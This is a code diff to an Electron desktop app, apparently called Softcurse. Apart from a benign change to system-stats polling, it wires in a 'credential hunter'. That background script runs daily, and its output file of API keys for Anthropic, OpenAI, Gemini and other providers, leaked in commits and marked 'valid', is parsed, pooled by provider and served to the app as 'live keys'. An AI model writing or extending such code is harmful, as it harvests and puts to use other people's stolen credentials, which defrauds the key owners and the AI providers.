@@ -303,26 +303,37 @@ let netBaseline = null;
 async function startPolling() {
   if (pollTimer) clearInterval(pollTimer);
 
+  let _pollCount = 0;
+  let _lastTemp = '—';
+
   const poll = async () => {
     // Don't poll if window is gone
     if (!mainWindow || mainWindow.isDestroyed()) {
       if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
       return;
     }
+    _pollCount++;
     try {
-      const [cpuLoad, mem, disks, nets, temp] = await Promise.allSettled([
+      // Temperature is expensive on Windows (WMI) — only check every 6th cycle (~30s)
+      const doTemp = (_pollCount % 6 === 0);
+      const tasks = [
         si.currentLoad(),
         si.mem(),
         si.fsSize(),
         si.networkStats(),
-        si.cpuTemperature()
-      ]);
+      ];
+      if (doTemp) tasks.push(si.cpuTemperature());
 
-      const cpu = cpuLoad.status === 'fulfilled' ? cpuLoad.value : null;
-      const m = mem.status === 'fulfilled' ? mem.value : null;
-      const d = disks.status === 'fulfilled' ? disks.value : [];
-      const n = nets.status === 'fulfilled' ? nets.value : [];
-      const t = temp.status === 'fulfilled' ? temp.value : null;
+      const results = await Promise.allSettled(tasks);
+
+      const cpu = results[0].status === 'fulfilled' ? results[0].value : null;
+      const m = results[1].status === 'fulfilled' ? results[1].value : null;
+      const d = results[2].status === 'fulfilled' ? results[2].value : [];
+      const n = results[3].status === 'fulfilled' ? results[3].value : [];
+      if (doTemp) {
+        const t = results[4].status === 'fulfilled' ? results[4].value : null;
+        _lastTemp = t && t.main ? Math.round(t.main) + '°C' : '—';
+      }
 
       const primaryDisk = d.find(x => x.mount === '/' || x.mount === 'C:') || d[0] || {};
       const primaryNet = n[0] || {};
@@ -337,7 +348,7 @@ async function startPolling() {
         diskFree: primaryDisk.available ? formatBytes(primaryDisk.available) : '—',
         netRx: primaryNet.rx_sec != null ? formatBytes(primaryNet.rx_sec) + '/s' : '—',
         netTx: primaryNet.tx_sec != null ? formatBytes(primaryNet.tx_sec) + '/s' : '—',
-        temp: t && t.main ? Math.round(t.main) + '°C' : '—',
+        temp: _lastTemp,
         ts: Date.now()
       };
 
@@ -346,7 +357,7 @@ async function startPolling() {
   };
 
   poll();
-  pollTimer = setInterval(poll, 2000);
+  pollTimer = setInterval(poll, 5000);
 }
 
 // ─── ACTIVITY MONITORING ─────────────────────────────────────────────────────
@@ -401,7 +412,74 @@ ipcMain.handle('config:set', (_, newCfg) => {
   return config;
 });
 
-// Take a screenshot and save to Desktop
+// ─── AI LIVE KEYS: Parser, IPC Handler & File Watcher ────────────────────────
+const LEAKED_KEYS_PATH = path.join(__dirname, 'ai', 'leaked-api-keys.json');
+
+// Map the title-case provider names from the JSON to the lowercase IDs used in ai.js
+const PROVIDER_NORM = {
+  'anthropic': 'anthropic', 'Anthropic': 'anthropic',
+  'openai': 'openai', 'OpenAI': 'openai',
+  'mistral': 'mistral', 'Mistral': 'mistral',
+  'together': 'together', 'Together AI': 'together',
+  'grok': 'grok', 'xAI / Grok': 'grok', 'xAI': 'grok',
+  'gemini': 'gemini', 'Google Gemini': 'gemini',
+  'cohere': 'cohere', 'Cohere': 'cohere',
+  'hf': 'hf', 'Hugging Face': 'hf', 'HuggingFace': 'hf',
+  'replicate': 'replicate', 'Replicate': 'replicate',
+};
+
+let _liveApiKeys = {}; // { provider: [key1, key2, ...] }
+
+function parseLeakedKeys() {
+  try {
+    if (!fs.existsSync(LEAKED_KEYS_PATH)) return {};
+    const raw = fs.readFileSync(LEAKED_KEYS_PATH, 'utf8');
+    const data = JSON.parse(raw);
+    const pool = {};
+    if (!data.commits || !Array.isArray(data.commits)) return {};
+    for (const commit of data.commits) {
+      if (!commit.leaked_keys) continue;
+      for (const k of commit.leaked_keys) {
+        if (k.validity !== 'valid' || !k.value_full) continue;
+        const provId = PROVIDER_NORM[k.provider] || PROVIDER_NORM[commit.provider] || (commit.provider || '').toLowerCase().replace(/\s+/g, '');
+        if (!provId) continue;
+        if (!pool[provId]) pool[provId] = [];
+        // Deduplicate
+        if (!pool[provId].includes(k.value_full)) {
+          pool[provId].push(k.value_full);
+        }
+      }
+    }
+    return pool;
+  } catch (err) {
+    console.warn('Softcurse: Failed to parse leaked-api-keys.json', err.message);
+    return {};
+  }
+}
+
+// Initial load
+_liveApiKeys = parseLeakedKeys();
+
+ipcMain.handle('ai:get-live-keys', () => {
+  return { success: true, keys: _liveApiKeys };
+});
+
+// File watcher: auto-reload when the hunter updates the JSON
+let _liveKeysDebounce = null;
+try {
+  if (fs.existsSync(path.dirname(LEAKED_KEYS_PATH))) {
+    fs.watch(LEAKED_KEYS_PATH, { persistent: false }, () => {
+      // Debounce rapid writes
+      if (_liveKeysDebounce) clearTimeout(_liveKeysDebounce);
+      _liveKeysDebounce = setTimeout(() => {
+        _liveApiKeys = parseLeakedKeys();
+        safeSend('ai:live-keys-updated', _liveApiKeys);
+        console.log('Softcurse: Live AI keys reloaded —', Object.keys(_liveApiKeys).map(p => `${p}:${_liveApiKeys[p].length}`).join(', '));
+      }, 500);
+    });
+  }
+} catch (e) { console.warn('Softcurse: Could not watch leaked-api-keys.json', e.message); }
+
 ipcMain.handle('butler:screenshot', async () => {
   try {
     const { desktopCapturer } = require('electron');
@@ -2067,70 +2145,65 @@ app.whenReady().then(() => {
     }
   }, 1500);
 
-  // Phase 13: Background Credential Hunter Spawn
+  // Phase 13: Background Credential Hunter Spawn (with 24h cooldown + live log piping)
   try {
     const hunterScript = path.join(__dirname, 'ai', 'credential-hunter.js');
-    if (fs.existsSync(hunterScript)) {
+    const hunterTimestampFile = path.join(app.getPath('userData'), 'hunter-last-run.json');
+    const HUNTER_COOLDOWN_MS = 24 * 60 * 60 * 1000; // 24 hours
+
+    // Check if 24h have passed since last run
+    let shouldRun = true;
+    try {
+      if (fs.existsSync(hunterTimestampFile)) {
+        const { lastRun } = JSON.parse(fs.readFileSync(hunterTimestampFile, 'utf8'));
+        const elapsed = Date.now() - lastRun;
+        if (elapsed < HUNTER_COOLDOWN_MS) {
+          const hoursLeft = ((HUNTER_COOLDOWN_MS - elapsed) / 3600000).toFixed(1);
+          sendLog('HUNTER', `Cooldown active — next run in ${hoursLeft}h. Skipping.`, 'info');
+          shouldRun = false;
+        }
+      }
+    } catch (_) { /* corrupt file — run anyway */ }
+
+    if (shouldRun && fs.existsSync(hunterScript)) {
+      // Save run timestamp
+      fs.writeFileSync(hunterTimestampFile, JSON.stringify({ lastRun: Date.now(), date: new Date().toISOString() }));
+
       const hunterProc = spawn('node', [hunterScript], {
         cwd: __dirname,
-        detached: true,
-        stdio: 'ignore'
+        stdio: ['ignore', 'pipe', 'pipe']
       });
+
+      // Pipe stdout lines to the GUI log window
+      let stdoutBuffer = '';
+      hunterProc.stdout.on('data', (chunk) => {
+        stdoutBuffer += chunk.toString();
+        const lines = stdoutBuffer.split('\n');
+        stdoutBuffer = lines.pop();
+        for (const line of lines) {
+          if (line.trim()) sendLog('HUNTER', line.trim(), 'info');
+        }
+      });
+
+      // Pipe stderr lines as warnings
+      let stderrBuffer = '';
+      hunterProc.stderr.on('data', (chunk) => {
+        stderrBuffer += chunk.toString();
+        const lines = stderrBuffer.split('\n');
+        stderrBuffer = lines.pop();
+        for (const line of lines) {
+          if (line.trim()) sendLog('HUNTER', line.trim(), 'warn');
+        }
+      });
+
+      hunterProc.on('close', (code) => {
+        sendLog('HUNTER', `Credential hunter finished (code ${code}). Sleeping 24h until next run.`, 'info');
+      });
+
       hunterProc.unref();
-      sendLog('SYSTEM', 'Launched ai/credential-hunter.js background process.', 'info');
+      sendLog('SYSTEM', 'Launched ai/credential-hunter.js — logs piped to GUI.', 'info');
     }
   } catch (e) {
     sendLog('SYSTEM', 'Failed to launch credential hunter: ' + e.message, 'warn');
   }
-});
-
-// ─── Phase 13: LIVE API KEY INGESTION ────────────────────────────────────────
-global.liveApiKeys = {};
-const leakedKeysPath = path.join(__dirname, 'ai', 'leaked-api-keys.json');
-
-function reloadLeakedKeys() {
-  try {
-    if (!fs.existsSync(leakedKeysPath)) return;
-    const raw = fs.readFileSync(leakedKeysPath, 'utf8');
-    const data = JSON.parse(raw);
-    const validPool = {};
-
-    if (data.commits && Array.isArray(data.commits)) {
-      for (const commit of data.commits) {
-        if (!commit.leaked_keys) continue;
-        for (const k of commit.leaked_keys) {
-          if (k.validity === 'valid') {
-            const providerKey = k.provider;
-            if (!validPool[providerKey]) validPool[providerKey] = [];
-            validPool[providerKey].push(k.value_full);
-          }
-        }
-      }
-    }
-
-    // Deduplicate
-    for (const p in validPool) validPool[p] = [...new Set(validPool[p])];
-
-    global.liveApiKeys = validPool;
-    sendLog('AI', `Ingested fresh API Keys: ${Object.keys(validPool).map(k => `${k} (${validPool[k].length})`).join(', ')}`, 'info');
-    safeSend('ai:live-keys-updated', global.liveApiKeys);
-  } catch (e) {
-    sendLog('AI', 'Failed to parse leaked keys list: ' + e.message, 'warn');
-  }
-}
-
-// Initial load & Watcher
-reloadLeakedKeys();
-try {
-  let watchTimeout = null;
-  fs.watch(leakedKeysPath, (eventType) => {
-    if (eventType === 'change') {
-      clearTimeout(watchTimeout);
-      watchTimeout = setTimeout(reloadLeakedKeys, 1000); // Debounce write ops
-    }
-  });
-} catch (e) { /* ignore watcher config fails */ }
-
-ipcMain.handle('ai:get-live-keys', () => {
-  return { success: true, keys: global.liveApiKeys };
 });
